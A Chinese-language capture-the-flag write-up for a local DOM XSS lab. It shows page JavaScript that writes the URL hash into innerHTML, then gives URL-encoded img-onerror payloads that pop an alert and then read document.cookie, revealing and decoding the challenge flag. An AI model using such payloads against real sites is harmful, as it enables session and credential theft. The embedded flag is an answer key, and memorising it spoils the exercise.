# 08-xss-dom 手工复刻

## 1. 观察页面功能

打开首页后，页面提示：

```text
在 URL 后加 #memo=你的内容 即可渲染。
```

例如：

```text
http://127.0.0.1:33849/#memo=Hello_World
```

页面会把 `memo` 的内容显示到「当前便签」区域。

---

## 2. 查看关键源码

浏览器右键查看源代码，能看到核心 JavaScript：

```js
function render() {
  var hash = location.hash.slice(1);
  var params = new URLSearchParams(hash);
  var memo = params.get("memo") || "";
  document.getElementById("memo").innerHTML = decodeURIComponent(memo);
}
window.addEventListener("hashchange", render);
render();
```

漏洞点是：

```js
document.getElementById("memo").innerHTML = decodeURIComponent(memo);
```

`memo` 来自 URL hash，未过滤就写入 `innerHTML`，因此可以触发 DOM XSS。

---

## 3. 手工验证 DOM XSS

访问下面的 URL：

```text
http://127.0.0.1:33849/#memo=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

解码后 payload 是：

```html
<img src="x" onerror="alert(1)" />
```

如果浏览器弹出 `1`，说明 DOM XSS 成功。

---

## 4. 读取 cookie

页面提示 cookie 保存了关键凭证，因此把 payload 改成读取 `document.cookie`：

```text
http://127.0.0.1:33849/#memo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E
```

解码后：

```html
<img src="x" onerror="alert(document.cookie)" />
```

浏览器弹窗中可以看到：

```text
MEMO_KEY=TOGOGO-flag%7Be7e76304-3a6b-4a86-a7a3-462396cccb4d%7D
```

---

## 5. URL 解码得到 flag

把 cookie 值 URL 解码：

```text
TOGOGO-flag%7Be7e76304-3a6b-4a86-a7a3-462396cccb4d%7D
```

得到：

```text
TOGOGO-flag{e7e76304-3a6b-4a86-a7a3-462396cccb4d}
```
